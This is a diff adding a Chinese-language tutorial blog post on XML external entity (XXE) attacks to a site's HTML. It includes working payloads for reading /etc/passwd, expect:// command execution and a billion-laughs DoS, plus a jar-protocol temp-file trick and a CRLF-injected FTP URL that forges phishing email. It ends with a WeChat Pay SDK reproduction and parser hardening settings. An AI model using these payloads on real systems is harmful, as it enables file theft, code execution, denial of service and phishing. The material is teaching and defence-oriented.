+public class xml_test
+{
+    public static void main(String[] args) throws Exception
+    {
+        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+        DocumentBuilder db = dbf.newDocumentBuilder();
+
+        Document doc = db.parse(new File("student.xml"));
+        //获得根元素结点
+        Element root = doc.getDocumentElement();
+
+        parseElement(root);
+    }
+
+    private static void parseElement(Element element)
+    {
+        String tagName = element.getNodeName();
+
+        NodeList children = element.getChildNodes();
+
+        System.out.print("&lt;" + tagName);
+
+        //element元素的所有属性所构成的NamedNodeMap对象，需要对其进行判断
+        NamedNodeMap map = element.getAttributes();
+
+        //如果该元素存在属性
+        if(null != map)
+        {
+            for(int i = 0; i &lt; map.getLength(); i++)
+            {
+                //获得该元素的每一个属性
+                Attr attr = (Attr)map.item(i);
+
+                String attrName = attr.getName();
+                String attrValue = attr.getValue();
+
+                System.out.print(" " + attrName + "=\"" + attrValue + "\"");
+            }
+        }
+
+        System.out.print("&gt;");
+
+        for(int i = 0; i &lt; children.getLength(); i++)
+        {
+            Node node = children.item(i);
+            //获得结点的类型
+            short nodeType = node.getNodeType();
+
+            if(nodeType == Node.ELEMENT_NODE)
+            {
+                //是元素，继续递归
+                parseElement((Element)node);
+            }
+            else if(nodeType == Node.TEXT_NODE)
+            {
+                //递归出口
+                System.out.print(node.getNodeValue());
+            }
+            else if(nodeType == Node.COMMENT_NODE)
+            {
+                System.out.print("&lt;!--");
+
+                Comment comment = (Comment)node;
+
+                //注释内容
+                String data = comment.getData();
+
+                System.out.print(data);
+
+                System.out.print("--&gt;");
+            }
+        }
+
+        System.out.print("&lt;/" + tagName + "&gt;");
+    }
+}</code></pre>
+<p>有了这个源码以后，我们需要在本地建立一个 xml 文件 ，我取名为 student.xml</p>
+<p><strong>student.xml</strong></p>
+<pre><code>&lt;!DOCTYPE convert [ 
+&lt;!ENTITY  remote SYSTEM "jar:http://localhost:9999/jar.zip!/wm.php"&gt;
+]&gt;
+&lt;convert&gt;&amp;remote;&lt;/convert&gt;</code></pre>
+<p><strong>目录结构如下图：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-ea691684-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-ea691684-ec17-1.png" alt="img"></a></p>
+<p>可以清楚地看到我的请求是向自己本地的 9999 端口发出的，那么9999 端口上有什么服务呢？实际上是我自己用 python 写的一个 TCP 服务器</p>
+<p><strong>示例代码：</strong></p>
+<p><strong>sever.py</strong></p>
+<pre><code>import sys 
+import time 
+import threading 
+import socketserver 
+from urllib.parse import quote 
+import http.client as httpc 
+
+listen_host = 'localhost' 
+listen_port = 9999 
+jar_file = sys.argv[1]
+
+class JarRequestHandler(socketserver.BaseRequestHandler):  
+    def handle(self):
+        http_req = b''
+        print('New connection:',self.client_address)
+        while b'\r\n\r\n' not in http_req:
+            try:
+                http_req += self.request.recv(4096)
+                print('Client req:\r\n',http_req.decode())
+                jf = open(jar_file, 'rb')
+                contents = jf.read()
+                headers = ('''HTTP/1.0 200 OK\r\n'''
+                '''Content-Type: application/java-archive\r\n\r\n''')
+                self.request.sendall(headers.encode('ascii'))
+
+                self.request.sendall(contents[:-1])
+                time.sleep(30)
+                print(30)
+                self.request.sendall(contents[-1:])
+
+            except Exception as e:
+                print ("get error at:"+str(e))
+
+
+if __name__ == '__main__':
+
+    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) 
+    print ('waiting for connection...') 
+    server_thread = threading.Thread(target=jarserver.serve_forever) 
+    server_thread.daemon = True 
+    server_thread.start() 
+    server_thread.join()</code></pre>
+<p>这个服务器的目的就是接受客户端的请求，然后向客户端发送一个我们运行时就传入的参数指定的文件，但是还没完，实际上我在这里加了一个 sleep(30)，这个的目的我后面再说</p>
+<p>既然是文件上传，那我们又要回到 jar 协议解析文件的过程中了</p>
+<blockquote>
+<p><strong>jar 协议处理文件的过程：</strong></p>
+<p>(1) 下载 jar/zip 文件到临时文件中<br> (2) 提取出我们指定的文件<br> (3) 删除临时文件</p>
+</blockquote>
+<p>那我们怎么找到这个临时的文件夹呢？不用想，肯定是通过报错的形式展现，如果我们请求的</p>
+<pre><code>jar:http://localhost:9999/jar.zip!/1.php</code></pre>
+<p>1.php 在这个 jar.zip 中没有的话，java 解析器就会报错，说在这个临时文件中找不到这个文件</p>
+<p><strong>如下图：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-eaa1b2aa-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-eaa1b2aa-ec17-1.png" alt="img"></a></p>
+<p>既然找到了临时文件的路径，我们就要考虑怎么使用这个文件了（或者说怎么让这个文件能更长时间的停留在我们的系统之中，我想到的方式就是sleep()）但是还有一个问题，因为我们要利用的时候肯定是在文件没有完全传输成果的时候，因此为了文件的完整性，我考虑在传输前就使用 hex 编辑器在文件末尾添加垃圾字符，这样就能完美的解决这个问题</p>
+<p><strong>下面是我的实验录屏：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002650-eae69596-ec17-1.gif"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002650-eae69596-ec17-1.gif" alt="img"></a></p>
+<p>实验就到这一步了，怎么利用就看各位大佬的了（坏笑）</p>
+<p>我后来在LCTF 2018 出了这样一个 CTF 题目，详细的 wp 可以看我的[这篇文章](<a target="_blank" rel="noopener" href="http://www.k0rz3n.com/2018/11/19/LCTF">http://www.k0rz3n.com/2018/11/19/LCTF</a> 2018 T4lk 1s ch34p,sh0w m3 the sh31l 详细分析/)</p>
+<h3 id="实验七：钓鱼："><a href="#实验七：钓鱼：" class="headerlink" title="实验七：钓鱼："></a><strong>实验七：钓鱼：</strong></h3><p>如果内网有一台易受攻击的 SMTP 服务器，我们就能利用  ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼（一下实例来自fb 的一篇文章 ）</p>
+<p>Java支持在sun.net.ftp.impl.FtpClient中的ftp URI。因此，我们可以指定用户名和密码，例如<a href="ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。">ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。</a></p>
+<p>但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：</p>
+<p><strong>示例代码：</strong></p>
+<pre><code>ftp://a%0D%0A
+EHLO%20a%0D%0A
+MAIL%20FROM%3A%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0A
+RCPT%20TO%3A%3Cvictim%40gmail.com%3E%0D%0A
+DATA%0D%0A
+From%3A%20support%40VULNERABLESYSTEM.com%0A
+To%3A%20victim%40gmail.com%0A
+Subject%3A%20test%0A
+%0A
+test!%0A
+%0D%0A
+.%0D%0A
+QUIT%0D%0A
+:a@VULNERABLESYSTEM.com:25</code></pre>
+<p>当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM.com上的邮件服务器：</p>
+<p><strong>示例代码：</strong></p>
+<pre><code>ftp://a
+EHLO a
+MAIL FROM: &lt;support@VULNERABLESYSTEM.com&gt;
+RCPT TO: &lt;victim@gmail.com&gt;
+DATA
+From: support@VULNERABLESYSTEM.com
+To: victim@gmail.com
+Subject: Reset your password
+We need to confirm your identity. Confirm your password here: http://PHISHING_URL.com
+.
+QUIT
+:support@VULNERABLESYSTEM.com:25</code></pre>
+<p>这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。</p>
+<h3 id="实验八：其他："><a href="#实验八：其他：" class="headerlink" title="实验八：其他："></a><strong>实验八：其他：</strong></h3><p>除了上面实验中的一些常见利用以外还有一些不是很常用或者比较鸡肋的利用方式，为了完整性我在这一节简单的说一下：</p>
+<h4 id="1-PHP-expect-RCE"><a href="#1-PHP-expect-RCE" class="headerlink" title="1.PHP expect RCE"></a><strong>1.PHP expect RCE</strong></h4><p>由于 PHP 的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE</p>
+<p><strong>示例代码：</strong></p>
+<pre><code>&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM "expect://id"&gt;]&gt;
+&lt;dir&gt;
+&lt;file&gt;&amp;cmd;&lt;/file&gt;
+&lt;/dir&gt;</code></pre>
+<h4 id="2-利用-XXE-进行-DOS-攻击"><a href="#2-利用-XXE-进行-DOS-攻击" class="headerlink" title="2. 利用 XXE 进行 DOS 攻击"></a><strong>2. 利用 XXE 进行 DOS 攻击</strong></h4><p><strong>示例代码：</strong></p>
+<pre><code>&lt;?xml version="1.0"?&gt;
+     &lt;!DOCTYPE lolz [
+     &lt;!ENTITY lol "lol"&gt;
+     &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
+     &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
+     &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;
+     &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;
+     &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;
+     &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;
+     &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;
+     &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;
+     ]&gt;
+     &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre>
+<h2 id="五、真实的-XXE-出现在哪"><a href="#五、真实的-XXE-出现在哪" class="headerlink" title="五、真实的 XXE 出现在哪"></a><strong>五、真实的 XXE 出现在哪</strong></h2><p>我们刚刚说了那么多，都是只是我们对这个漏洞的理解，但是好像还没说这种漏洞出现在什么地方</p>
+<p>如今的 web 时代，是一个前后端分离的时代，有人说 MVC  就是前后端分离，但我觉得这种分离的并不彻底，后端还是要尝试去调用渲染类去控制前端的渲染，我所说的前后端分离是，后端 api  只负责接受约定好要传入的数据，然后经过一系列的黑盒运算，将得到结果以 json  格式返回给前端，前端只负责坐享其成，拿到数据json.decode 就行了（这里的后端可以是后台代码，也可以是外部的api  接口，这里的前端可以是传统意义的前端，也可以是后台代码）</p>
+<p>那么问题经常就出现在 api 接口能解析客户端传过来的 xml 代码，并且直接外部实体的引用，比如下面这个</p>
+<h3 id="实例一：模拟情况"><a href="#实例一：模拟情况" class="headerlink" title="实例一：模拟情况"></a><strong>实例一：模拟情况</strong></h3><p><strong>示例代码：</strong></p>
+<pre><code>POST /vulnerable HTTP/1.1
+Host: www.test.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: https://test.com/test.html
+Content-Type: application/xml
+Content-Length: 294
+Cookie: mycookie=cookies;
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+&lt;?xml version="1.0"?&gt;
+&lt;catalog&gt;
+   &lt;core id="test101"&gt;
+      &lt;author&gt;John, Doe&lt;/author&gt;
+      &lt;title&gt;I love XML&lt;/title&gt;
+      &lt;category&gt;Computers&lt;/category&gt;
+      &lt;price&gt;9.99&lt;/price&gt;
+      &lt;date&gt;2018-10-01&lt;/date&gt;
+      &lt;description&gt;XML is the best!&lt;/description&gt;
+   &lt;/core&gt;
+&lt;/catalog&gt;</code></pre>
+<p>我们发出 带有 xml 的 POST 请求以后，述代码将交由服务器的XML处理器解析。代码被解释并返回：{“Request Successful”: “Added!”}</p>
+<p>但是如果我们传入一个恶意的代码</p>
+<pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
+&lt;catalog&gt;
+   &lt;core id="test101"&gt;
+      &lt;author&gt;John, Doe&lt;/author&gt;
+      &lt;title&gt;I love XML&lt;/title&gt;
+      &lt;category&gt;Computers&lt;/category&gt;
+      &lt;price&gt;9.99&lt;/price&gt;
+      &lt;date&gt;2018-10-01&lt;/date&gt;
+      &lt;description&gt;&amp;xxe;&lt;/description&gt;
+   &lt;/core&gt;
+&lt;/catalog&gt;</code></pre>
+<p>如果没有做好“安全措施” 就会出现解析恶意代码的情况，就会有下面的返回</p>
+<pre><code>{"error": "no results for description root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync...</code></pre>
+<h3 id="实例二：微信支付的-XXE"><a href="#实例二：微信支付的-XXE" class="headerlink" title="实例二：微信支付的 XXE"></a><strong>实例二：微信支付的 XXE</strong></h3><p>前一阵子非常火的微信支付的 XXE 漏洞当然不得不提，</p>
+<p><strong>漏洞描述：</strong></p>
+<p>微信支付提供了一个 api 接口，供商家接收异步支付结果，微信支付所用的java  sdk在处理结果时可能触发一个XXE漏洞，攻击者可以向这个接口发送构造恶意payloads,获取商家服务器上的任何信息，一旦攻击者获得了敏感的数据 (md5-key and merchant-Id etc.)，他可能通过发送伪造的信息不用花钱就购买商家任意物品</p>
+<p>我下载了 java 版本的 sdk 进行分析，这个 sdk 提供了一个 WXPayUtil 工具类，该类中实现了xmltoMap和maptoXml这两个方法，而这次的微信支付的xxe漏洞爆发点就在xmltoMap方法中</p>
+<p><strong>如图所示：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002650-eb304d9e-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002650-eb304d9e-ec17-1.png" alt="img"></a></p>
+<p>问题就出现在我横线划出来的那部分，也就是简化为下面的代码：</p>
+<pre><code>public static Map&lt;String, String&gt; xmlToMap(String strXML) throws Exception {
+        try {
+            Map&lt;String, String&gt; data = new HashMap&lt;String, String&gt;();
+            DocumentBuilder documentBuilder = WXPayXmlUtil.newDocumentBuilder();
+            InputStream stream = new ByteArrayInputStream(strXML.getBytes("UTF-8"));
+            org.w3c.dom.Document doc = documentBuilder.parse(stream);
+            ...</code></pre>
+<p>我们可以看到 当构建了 documentBuilder 以后就直接对传进来的 strXML  解析了，而不巧的是 strXML 是一处攻击者可控的参数，于是就出现了 XXE 漏洞，下面是我实验的步骤</p>
+<p>首先我在 com 包下又新建了一个包，来写我们的测试代码，测试代码我命名为 test001.java</p>
+<p><strong>如图所示：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002651-eb80dca0-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002651-eb80dca0-ec17-1.png" alt="img"></a></p>
+<p><strong>test001.java</strong></p>
+<pre><code>package com.test.test001;
+
+import java.util.Map;
+
+import static com.github.wxpay.sdk.WXPayUtil.xmlToMap;
+
+public class test001 {
+    public static void main(String args[]) throws Exception {
+
+        String xmlStr ="&lt;?xml version='1.0' encoding='utf-8'?&gt;\r\n" +
+                "&lt;!DOCTYPE XDSEC [\r\n" +
+                "&lt;!ENTITY xxe SYSTEM 'file:///d:/1.txt'&gt;]&gt;\r\n" +
+                "&lt;XDSEC&gt;\r\n"+
+                "&lt;XXE&gt;&amp;xxe;&lt;/XXE&gt;\r\n" +
+                "&lt;/XDSEC&gt;";
+
+        try{
+
+            Map&lt;String,String&gt; test = xmlToMap(xmlStr);
+            System.out.println(test);
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+
+    }
+}</code></pre>
+<p>我希望它能读取我 D 盘下面的 1.txt 文件</p>
+<p>运行后成功读取</p>
+<p><strong>如图所示：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002651-eba50724-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002651-eba50724-ec17-1.png" alt="img"></a></p>
+<p>当然，WXPayXmlUtil.java 中有这个 sdk 的配置项，能直接决定实验的效果，当然后期的修复也是针对这里面进行修复的</p>
+<pre><code>http://apache.org/xml/features/disallow-doctype-decl true
+http://apache.org/xml/features/nonvalidating/load-external-dtd false
+http://xml.org/sax/features/external-general-entities false
+http://xml.org/sax/features/external-parameter-entities false</code></pre>
+<p>整个源码我打包好了已经上传到我的百度云，有兴趣的童鞋可以运行一下感受：</p>
+<blockquote>
+<p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1YbCO2cZpzZS1mWd7Mes4Qw">https://pan.baidu.com/s/1YbCO2cZpzZS1mWd7Mes4Qw</a>  提取码：xq1b</p>
+</blockquote>
+<p>上面说过 java 中有一个 netdoc:/ 协议能代替 file:/// ,我现在来演示一下：</p>
+<p><strong>如图所示：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002652-ebdec6a8-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002652-ebdec6a8-ec17-1.png" alt="img"></a></p>
+<h3 id="实例三：JSON-content-type-XXE"><a href="#实例三：JSON-content-type-XXE" class="headerlink" title="实例三：JSON content-type XXE"></a><strong>实例三：JSON content-type XXE</strong></h3><p>正如我们所知道的，很多web和移动应用都基于客户端-服务器交互模式的web通信服务。不管是SOAP还是RESTful，一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击</p>
+<h4 id="原始请求和响应："><a href="#原始请求和响应：" class="headerlink" title="原始请求和响应："></a><strong>原始请求和响应：</strong></h4><p><strong>HTTP Request:</strong></p>
+<pre><code>POST /netspi HTTP/1.1
+Host: someserver.netspi.com
+Accept: application/json
+Content-Type: application/json
+Content-Length: 38
+
+{"search":"name","value":"netspitest"}</code></pre>
+<p><strong>HTTP Response:</strong></p>
+<pre><code>HTTP/1.1 200 OK
+Content-Type: application/json
+Content-Length: 43
+
+{"error": "no results for name netspitest"}</code></pre>
+<p>现在我们尝试将 Content-Type 修改为 application/xml</p>
+<h4 id="进一步请求和响应："><a href="#进一步请求和响应：" class="headerlink" title="进一步请求和响应："></a><strong>进一步请求和响应：</strong></h4><p><strong>HTTP Request:</strong></p>
+<pre><code>POST /netspi HTTP/1.1
+Host: someserver.netspi.com
+Accept: application/json
+Content-Type: application/xml
+Content-Length: 38
+
+{"search":"name","value":"netspitest"}</code></pre>
+<p><strong>HTTP Response:</strong></p>
+<pre><code>HTTP/1.1 500 Internal Server Error
+Content-Type: application/json
+Content-Length: 127
+
+{"errors":{"errorMessage":"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity."}}</code></pre>
+<p>可以发现服务器端是能处理 xml 数据的，于是我们就可以利用这个来进行攻击</p>
+<h4 id="最终的请求和响应："><a href="#最终的请求和响应：" class="headerlink" title="最终的请求和响应："></a><strong>最终的请求和响应：</strong></h4><p><strong>HTTP Request:</strong></p>
+<pre><code>POST /netspi HTTP/1.1
+Host: someserver.netspi.com
+Accept: application/json
+Content-Type: application/xml
+Content-Length: 288
+
+&lt;?xml version="1.0" encoding="UTF-8" ?&gt;
+&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
+&lt;root&gt;
+&lt;search&gt;name&lt;/search&gt;
+&lt;value&gt;&amp;xxe;&lt;/value&gt;
+&lt;/root&gt;</code></pre>
+<p><strong>HTTP Response:</strong></p>
+<pre><code>HTTP/1.1 200 OK
+Content-Type: application/json
+Content-Length: 2467
+
+{"error": "no results for name root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync....</code></pre>
+<h2 id="六、XXE-如何防御"><a href="#六、XXE-如何防御" class="headerlink" title="六、XXE 如何防御"></a><strong>六、XXE 如何防御</strong></h2><h3 id="方案一：使用语言中推荐的禁用外部实体的方法"><a href="#方案一：使用语言中推荐的禁用外部实体的方法" class="headerlink" title="方案一：使用语言中推荐的禁用外部实体的方法"></a><strong>方案一：使用语言中推荐的禁用外部实体的方法</strong></h3><p><strong>PHP：</strong></p>
+<pre><code>libxml_disable_entity_loader(true);</code></pre>
+<p><strong>JAVA:</strong></p>
+<pre><code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
+dbf.setExpandEntityReferences(false);
+
+.setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);
+
+.setFeature("http://xml.org/sax/features/external-general-entities",false)
+
+.setFeature("http://xml.org/sax/features/external-parameter-entities",false);</code></pre>
+<p><strong>Python：</strong></p>
+<pre><code>from lxml import etree
+xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre>
+<h3 id="方案二：手动黑名单过滤-不推荐"><a href="#方案二：手动黑名单过滤-不推荐" class="headerlink" title="方案二：手动黑名单过滤(不推荐)"></a><strong>方案二：手动黑名单过滤(不推荐)</strong></h3><p>过滤关键词：</p>
+<pre><code>&lt;!DOCTYPE、&lt;!ENTITY SYSTEM、PUBLIC</code></pre>
+<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357#toc-17">https://xz.aliyun.com/t/3357#toc-17</a></p>
+
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
                 <source type="audio/mpeg" src="">
@@ -83,7 +799,7 @@
     </div>
     
         <div class='side'>
-				
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81XXE-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.</span> <span class="toc-text">一、XXE 是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8B%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">二、简单介绍一下背景知识：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">三、基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E7%82%B9%E6%9D%A5%E4%BA%86%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">重点来了：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%88%91%E4%BB%AC%E8%83%BD%E5%81%9A%E4%BB%80%E4%B9%88"><span class="toc-number">4.</span> <span class="toc-text">四、我们能做什么</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E6%9C%89%E5%9B%9E%E6%98%BE%E8%AF%BB%E6%9C%AC%E5%9C%B0%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6-Normal-XXE"><span class="toc-number">4.1.</span> <span class="toc-text">实验一：有回显读本地敏感文件(Normal XXE)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%87%BA%E7%8E%B0"><span class="toc-number">4.2.</span> <span class="toc-text">新的问题出现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B0%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95"><span class="toc-number">4.3.</span> <span class="toc-text">新的解决方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BA%8C%EF%BC%9A%E6%97%A0%E5%9B%9E%E6%98%BE%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6-Blind-OOB-XXE"><span class="toc-number">4.4.</span> <span class="toc-text">实验二：无回显读取本地敏感文件(Blind OOB XXE)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B0%E7%9A%84%E6%80%9D%E8%80%83%EF%BC%9A"><span class="toc-number">4.5.</span> <span class="toc-text">新的思考：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B0%E7%9A%84%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">4.6.</span> <span class="toc-text">新的利用：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9AHTTP-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="toc-number">4.7.</span> <span class="toc-text">实验三：HTTP 内网主机探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%9B%9B%EF%BC%9AHTTP-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">4.8.</span> <span class="toc-text">实验四：HTTP 内网主机端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BA%94%EF%BC%9A%E5%86%85%E7%BD%91%E7%9B%B2%E6%B3%A8-CTF"><span class="toc-number">4.9.</span> <span class="toc-text">实验五：内网盲注(CTF)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%85%AD%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">4.10.</span> <span class="toc-text">实验六：文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%B8%83%EF%BC%9A%E9%92%93%E9%B1%BC%EF%BC%9A"><span class="toc-number">4.11.</span> <span class="toc-text">实验七：钓鱼：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%85%AB%EF%BC%9A%E5%85%B6%E4%BB%96%EF%BC%9A"><span class="toc-number">4.12.</span> <span class="toc-text">实验八：其他：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-PHP-expect-RCE"><span class="toc-number">4.12.1.</span> <span class="toc-text">1.PHP expect RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8-XXE-%E8%BF%9B%E8%A1%8C-DOS-%E6%94%BB%E5%87%BB"><span class="toc-number">4.12.2.</span> <span class="toc-text">2. 利用 XXE 进行 DOS 攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E7%9C%9F%E5%AE%9E%E7%9A%84-XXE-%E5%87%BA%E7%8E%B0%E5%9C%A8%E5%93%AA"><span class="toc-number">5.</span> <span class="toc-text">五、真实的 XXE 出现在哪</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E4%B8%80%EF%BC%9A%E6%A8%A1%E6%8B%9F%E6%83%85%E5%86%B5"><span class="toc-number">5.1.</span> <span class="toc-text">实例一：模拟情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E4%BA%8C%EF%BC%9A%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98%E7%9A%84-XXE"><span class="toc-number">5.2.</span> <span class="toc-text">实例二：微信支付的 XXE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E4%B8%89%EF%BC%9AJSON-content-type-XXE"><span class="toc-number">5.3.</span> <span class="toc-text">实例三：JSON content-type XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E5%A7%8B%E8%AF%B7%E6%B1%82%E5%92%8C%E5%93%8D%E5%BA%94%EF%BC%9A"><span class="toc-number">5.3.1.</span> <span class="toc-text">原始请求和响应：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 